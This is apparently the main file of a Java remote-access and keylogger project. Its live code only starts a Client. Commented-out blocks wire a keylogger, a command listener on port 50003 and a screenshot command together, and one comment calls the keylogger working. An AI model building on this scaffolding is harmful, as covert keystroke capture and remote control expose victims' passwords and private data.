package tk.arktech;


public class Main {

    /*public static final int commandNumber = 1;
    public static final int listenerNumber = 2;
    public static BlockingQueue<String> keyloggerCommandsQueue = new ArrayBlockingQueue<String>(20);

    public static void screenshot()
    {

    }

    public static void sendKeyloggerCommand(String st)
    {
        try {
            keyloggerCommandsQueue.put(st);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }*/

    public static void main(String[] args) {

        var cli = new Client();
        cli.run();


        /*ServerSocket svr = null;
        try {
            svr = new ServerSocket(50003);
            Socket connection = svr.accept(); //TODO: wstawić accept we właściwe miejsce

            BlockingQueue<String> commandQueue = new ArrayBlockingQueue<String>(20);
            var tcpListenerThread = new Thread(new TCPListener(commandQueue, connection.getInputStream(), commandNumber), "TCPLiestener");

            BlockingQueue<String> dataQueue = new ArrayBlockingQueue<String>(20);

            var keyloggerThread =  new Thread((new Keylogger(dataQueue, keyloggerCommandsQueue, listenerNumber)), "Keylogger");

            var commandParser = new CommandExecutor(Main::screenshot, "screenshot");
            commandParser.add(new OneCommandConsumer(Main::sendKeyloggerCommand));
            CommandClientParser queueParser = new CommandClientParser(commandParser, commandNumber);

            var dataParser = new CommandClientParser()


        } catch (IOException e) {
            e.printStackTrace();
        }*/




        /*ServerSocket svr = null;
        try {
            svr = new ServerSocket(50003);
            Socket connection = svr.accept();
            //TODO: zamkniecie polaczenia
            var istream = connection.getInputStream();
            var ostream = connection.getOutputStream();
            var buf = istream.readNBytes(16);
            ostream.write(buf);
            System.out.println("end");
        } catch (IOException e) {
            e.printStackTrace();
        }*/

//To działający keylogger
        /*BlockingQueue<String> test = new ArrayBlockingQueue<String>(10);
        BlockingQueue<String> commands = new ArrayBlockingQueue<String>(10);


        // Get the logger for "org.jnativehook" and set the level to off.
        Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
        logger.setLevel(Level.OFF);

// Don't forget to disable the parent handlers.
        logger.setUseParentHandlers(false);

         Thread thread = new Thread(new Keylogger(test, commands), "testowy");
         thread.start();

         Scanner sc = new Scanner(System.in);
         String data;
         System.out.println("Start");
         while(!(data = sc.next()).equals("terminate"))
         {
             System.out.print(">>");
             try {
                 commands.put(data);
                 String s = test.poll(10, TimeUnit.MILLISECONDS);
                 if(s != null)
                 {
                     s = s.replace("Enter", "\n");
                     System.out.println(s);
                 }
             } catch (InterruptedException e) {
                 e.printStackTrace();
             }
         }
         System.out.println("end");
        try {
            thread.join();
        } catch (InterruptedException e) {
            e.printStackTrace();
        }*/


    }



}
